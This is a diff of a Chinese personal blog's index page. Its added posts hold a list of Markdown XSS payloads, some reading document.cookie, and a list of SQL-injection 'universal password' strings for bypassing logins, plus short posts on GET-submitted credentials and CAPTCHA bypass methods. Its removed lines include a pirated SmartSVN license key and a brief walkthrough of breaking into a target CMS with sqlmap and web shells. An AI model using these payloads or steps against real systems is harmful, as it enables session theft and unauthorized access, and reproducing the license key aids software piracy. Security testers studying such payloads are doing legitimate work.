@@ -111,7 +111,7 @@
         
             <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
         
-            <li><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">渗透测试</a></li>
+            <li><a href="Web%E5%AE%89%E5%85%A8.html">Web安全</a></li>
         
             <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
         
@@ -137,6 +137,282 @@
 	<div class="large-8 medium-8 columns">
 		<div class="markdown-body home-categories">
 		
+			<div class="article">
+                <a class="clearlink" href="15586769387988.html">
+                
+                  <h1>Markdown XSS Payloads</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
+</blockquote>
+
+<p>Links</p>
+
+<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
+[Local Storage](javascript:alert(JSON.stringify(localStorage)))
+[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
+[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
+[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
+</code></pre>
+
+<p>Images</p>
+
+<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
+![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
+</code></pre>
+
+<p>Fuzzing</p>
+
+<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
+[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
+[XSS]: (javascript:prompt(document.cookie))
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0aprompt(1))
+[XSS](javascript://%0d%0aprompt(1);com)
+[XSS](javascript:window.onerror=alert;throw%20document.cookie)
+[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[XSS](vbscript:alert(document.domain))
+[XSS](javascript:this;alert(1))
+[XSS](javascript:this;alert(1&amp;#41;)
+[XSS](javascript&amp;#58this;alert(1&amp;#41;)
+[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
+[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
+[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
+[XSS](javascript:confirm(1)
+[XSS](javascript://www.google.com%0Aprompt(1))
+[XSS](javascript://%0d%0aconfirm(1);com)
+[XSS](javascript:window.onerror=confirm;throw%201)
+[XSS](�javascript:alert(document.domain&amp;#41;)
+![XSS](javascript:prompt(document.cookie))\
+![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
+![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
+</code></pre>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/24 13:48 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15586660103989.html">
+                
+                  <h1>使用GET方法传输用户账号密码的危害</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>通过 Get 方式提交数据时，用户名和密码将出现在 URL 上，如果页面可以被缓存（浏览器缓存、cdn 缓存、服务器缓存、中间件日志缓存等）或者其他人可以访问客户这台机器，就可以从历史记录获得该用户的帐号和密码，所以表单提交建议使用 Post 方法。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/24 10:46 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15586605529996.html">
+                
+                  <h1>验证码安全</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>由于业务迭代频繁，产品线众多...好了不废话了。简单来说就是很多网站的登录界面没有验证码，只有账号密码输入框，这样不安全。</p>
+
+<h2 id="toc_0">什么是验证码</h2>
+
+<p>全自动区分计算机和人类的图灵测试（Completely Automated Public Turing test to tell Computers and Humans Apart，简称CAPTCHA），俗称验证码，是一种区分用户是计算机或人的全自动化程序。</p>
+
+<h2 id="toc_1">验证码种类</h2>
+
+<p>1、图形验证码<br/>
+2、滑动验证码（比如极验）<br/>
+3、答题验证码<br/>
+4、手机短信/邮箱验证码<br/>
+5、动态口令</p>
+
+<h2 id="toc_2">验证码的作用</h2>
+
+<p>人机识别：识别使用对应功能的是人还是机器。<br/>
+防止机器暴力攻击：防止攻击者在短时间内用机器进行批量操作（常见功能场景如：登录）。</p>
+
+<h2 id="toc_3">验证码工作原理</h2>
+
+<p><figure><img src="media/15586605529996/15586616406956.jpg" alt=""/></figure></p>
+
+<h2 id="toc_4">验证码常用场景与作用</h2>
+
+<p>登录接口常使用验证码来防御攻击者的撞库攻击<br/>
+注册接口常用验证码来防御批量恶意注册<br/>
+身份认证<br/>
+重要表单提交<br/>
+修改密码<br/>
+支付等功能</p>
+
+<h2 id="toc_5">验证码使用</h2>
+
+<p>重要接口要加验证码<br/>
+常见的如登录、注册等接口推荐使用滑动验证码；重要的如改密、支付等功能推荐使用手机短信验证码；vpn登录、身份认证等推荐使用动态口令。</p>
+
+<h2 id="toc_6">验证码对抗技术</h2>
+
+<p>1、OCR 识别图形验证码<br/>
+2、机器识别验证码（常见流程：去噪处理-图像二值化-切片处理-文件图片标准化-字符模板识别）<br/>
+3、LTE／4G 伪基站＋GSM 中间人攻击实现手机短信验证码攻击（相关安全事件可见&quot;这下一无所有了&quot;：<a href="http://netsecurity.51cto.com/art/201808/580812.htm%EF%BC%89">http://netsecurity.51cto.com/art/201808/580812.htm）</a><br/>
+4、验证码流程绕过（空验证码、返回包含验证码、验证码固定、验证码前端校验、验证流程有误）<br/>
+5、人工打码平台</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/24 9:15 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15585815946395.html">
+                
+                  <h1>万能密码</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>内容收集自网络，是否有效并未验证<br/>
+原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
+</blockquote>
+
+<p>-------asp万能密码 <br/>
+      &#39;or&#39;=&#39;or&#39;</p>
+
+<p>--------aspx万能密码<br/>
+   1： &quot;or &quot;a&quot;=&quot;a<br/>
+   2： &#39;)or(&#39;a&#39;=&#39;a<br/>
+   3：or 1=1--<br/>
+   4：&#39;or 1=1--<br/>
+   5：a&#39;or&#39; 1=1--<br/>
+   6： &quot;or 1=1--<br/>
+   7：&#39;or&#39;a&#39;=&#39;a<br/>
+   8： &quot;or&quot;=&quot;a&#39;=&#39;a<br/>
+   9：&#39;or&#39;&#39;=&#39;<br/>
+   10：&#39;or&#39;=&#39;or&#39;<br/>
+   11: 1 or &#39;1&#39;=&#39;1&#39;=1<br/>
+   12: 1 or &#39;1&#39;=&#39;1&#39; or 1=1<br/>
+   13: &#39;OR 1=1%00<br/>
+   14: &quot;or 1=1%00<br/>
+   15: &#39;xor<br/>
+   16: 新型万能登陆密码</p>
+
+<p>   用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39; （替换表名admin）<br/>
+   密码 1<br/>
+   Username=-1%cf&#39; union select 1,1,1 as password,1,1,1 %23<br/>
+   Password=1</p>
+
+<p>   17..admin&#39; or &#39;a&#39;=&#39;a 密码随便<br/>
+ <br/>
+--------PHP万能密码<br/>
+   &#39;or&#39;=&#39;or&#39;<br/>
+   &#39;or 1=1/*  字符型 GPC是否开都可以使用</p>
+
+<p>   User: something<br/>
+   Pass: &#39; OR &#39;1&#39;=&#39;1</p>
+
+<p> <br/>
+--------jsp 万能密码<br/>
+   1&#39;or&#39;1&#39;=&#39;1<br/>
+   admin&#39; OR 1=1/*<br/>
+ <br/>
+   用户名：admin    系统存在这个用户的时候 才用得上<br/>
+   <br/>
+   密码：1&#39;or&#39;1&#39;=&#39;1</p>
+
+<hr/>
+
+<p>作者：xss_01 <br/>
+来源：CSDN <br/>
+原文：<a href="https://blog.csdn.net/u012804180/article/details/51932863">https://blog.csdn.net/u012804180/article/details/51932863</a> <br/>
+版权声明：本文为博主原创文章，转载请附上博文链接！</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/5/23 11:19 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
 			<div class="article">
                 <a class="clearlink" href="15578813198735.html">
                 
@@ -411,216 +687,6 @@ root/.ssh/id_rsa.pub</p>
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15573021402615.html">
-                
-                  <h1>Mac 上的 svnGUI 工具：smartsvn 安装、激活和使用</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>smartsvn 是 mac 上的 svn 客户端，svn 是类似 git 的版本控制工具。</p>
-
-<p>1、下载 smartsvn <a href="http://www.smartsvn.com/download">srmatsvn 官网下载地址</a><br/>
-2、在任意目录下新建文件 smartsvn.license，然后写入以下内容：</p>
-
-<pre class="line-numbers"><code class="language-text">Name=csdn  
-Address=1337 iNViSiBLE Str.  
-Email=admin@csdn.net  
-FreeUpdatesUntil=2099-09-26  
-LicenseCount=1337  
-Addon-xMerge=true  
-Addon-API=true  
-Enterprise=true  
-Key=4kl-&lt;Zqcm-iUF7I-IVmYG-XAyvv-KYRoC-xlgsv-sSBds-VAnP6  
-</code></pre>
-
-<p>3、在安装软件需要导入 license 时选择上述文件或者安装软件后在菜单栏的 help-register 中导入密钥文件即可激活软件。</p>
-
-<p>4、点击菜单栏的project-checkout，添加远程目录，然后输入认证信息，输入本地目录信息，即可挂载远程目录到本地。</p>
-
-<p>5、若认证出错，则点击菜单栏的 SmartSVN-preferences，然后选择 Authentication，使用 delete 删除之前存储的认证信息，然后重新 checkout 即可。</p>
-
-<h1 id="toc_0">Mac 终端下 svn 常用命令</h1>
-
-<p>Mac 可以不用安装 svnGUI 而直接使用命令进行 svn 操作，常见svn 命令如下：<br/>
-svn help 查看命令帮助<br/>
-svn checkout xxx 拉取远程目录到本地<br/>
-svn add file 往版本库中添加新文件</p>
-
-<p>更多常用命令可参考：<a href="https://www.cnblogs.com/luckythan/p/4478706.html">Mac终端下svn常用命令</a></p>
-
-<blockquote>
-<p>通过命令行操作进行认证后，其认证信息存储在 <code>~/.subversion/auth/svn.simple</code>目录下，若认证失败，需要在此目录下情况认证信息后重新进行认证。</p>
-</blockquote>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/8 15:55 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15572001451538.html">
-                
-                  <h1>c 语言中变量前面加`*`表示什么？如`*`p</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>*p的意思是：p是一个指针（即指向某一个区域的地址）<br/>
-如果前面加了修饰，就表示为那个类型的指针<br/>
-如：int *p;表示p是一个整型指针，指向一个整型变量的地址</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/7 11:35 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E5%BC%80%E5%8F%91.html'>开发</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15554899648347.html">
-                
-                  <h1>CEO、COO、CFO、CIO、CTO、CMO的中文是什么?</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<ol>
-<li>CEO：首席执行官</li>
-</ol>
-
-<p>首席执行官（Chief Executive Officer，缩写CEO）是在一个企业中负责日常事务的最高行政官员，主司企业行政事务，又称作司政、行政总裁、总经理或最高执行长。</p>
-
-<ol>
-<li>COO：首席运营官</li>
-</ol>
-
-<p>首席运营官（Chief Operating Officer，缩写COO，营运长），就是制定企业长远战略，督导各分公司总经理执行工作的官。主要是负责公司的日常运营，辅助CEO的工作。对CEO负责，负责企业的运营管理。COO在某些公司中同时任职总裁，但他们通常是常务或资深的副总裁。</p>
-
-<ol>
-<li>CFO：首席财务官</li>
-</ol>
-
-<p>首席财务官（Chief<br/>
-Financial<br/>
-Officer）是企业治理结构发展到一个新阶段的必然产物。没有首席财务官的治理结构不是现代意义上完善的治理结构。从这一层面上看，中国构造治理结构也应设立CFO之类的职位。当然，从本质上讲，CFO在现代治理结构中的真正含义，不是其名称的改变、官位的授予，而是其职责权限的取得，在管理中作用的真正发挥。</p>
-
-<ol>
-<li>CIO：首席信息官</li>
-</ol>
-
-<p>首席信息官（Chief Information Officer）中文意思是首席信息官或信息主管，是负责一个公司信息技术和系统所有领域的高级官员。是一个比较新的职位，目前只有在一些全球500强的大企业才设立职位。</p>
-
-<ol>
-<li>CTO：首席技术官</li>
-</ol>
-
-<p>首席技术官（Chief Technology Officer），即企业内负责技术的最高负责人。这个名称在1980年代从美国开始时兴起于做很多研究的大公司，如General Electric，AT&amp;T，ALCOA，主要责任是将科学研究成果成为盈利产品。</p>
-
-<ol>
-<li>CMO：首席营销官</li>
-</ol>
-
-<p>首席营销官（Chief Marketing Officer）是指企业中负责市场运营工作的高级管理人员，又称作市场部经理、营销总监。主要负责在企业中对营销思想进行定位；把握市场机会，制定市场营销战略和实施计划，完成企业的营销目标；协调企业内外部关系，对企业市场营销战略计划的执行进行监督和控制；负责企业营销组织建设与激励工作。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/4/17 16:32 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%98%9F%E7%81%AB%E6%B5%81%E8%90%A4.html'>星火流萤</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15554000328653.html">
-                
-                  <h1>最近遇到的一个靶机</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>1、查看 http 流量，后台扫描等进行信息收集，得出其用的是 xxxxcms，然后百度进一步进行信息收集，得出该 cms 存在过 sql 注入、文件包含等漏洞。<br/>
-2、全站测试 sql 注入，发现确实存在注入点<br/>
-3、上 sqlmap 进行扫描，得出管理员账号密码，得出 mysql 为普通用户权限。<br/>
-4、登录网站后台，利用文件包含漏洞获取部分.php 文件信息，对其进行编辑写入小马。（这块之前没怎么玩过，因此稍微花费了一点时间，目的达到了，不过不优雅）<br/>
-5、通过小马传入大马，然后连接大马。<br/>
-6、提权拿 linux 的 root，这里我不太懂，因此正在找资料，希望今晚能搞定提权这事。</p>
-
-<p>提权这块研究一下，搞出来了再写。目前的思路是通过 shell 查看操作系统版本和内核版本，查看已安装的包和程序，看看有没有一直漏洞可以利用。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/4/16 15:33 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -685,7 +751,7 @@ Officer）是企业治理结构发展到一个新阶段的必然产物。没有�
         
             <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
         
-            <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"><strong>渗透测试</strong></a>
+            <a href="Web%E5%AE%89%E5%85%A8.html"><strong>Web安全</strong></a>
         
             <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
         
@@ -706,31 +772,31 @@ Officer）是企业治理结构发展到一个新阶段的必然产物。没有�
 	      
 		      
 			      <li class="post">
+			        <a href="15586769387988.html">Markdown XSS Payloads</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15586660103989.html">使用GET方法传输用户账号密码的危害</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15586605529996.html">验证码安全</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15585815946395.html">万能密码</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15578813198735.html">家思</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15577346001597.html">linux 敏感目录</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15573021402615.html">Mac 上的 svnGUI 工具：smartsvn 安装、激活和使用</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15572001451538.html">c 语言中变量前面加`*`表示什么？如`*`p</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15554899648347.html">CEO、COO、CFO、CIO、CTO、CMO的中文是什么?</a>
 			      </li>
 		     
 		  
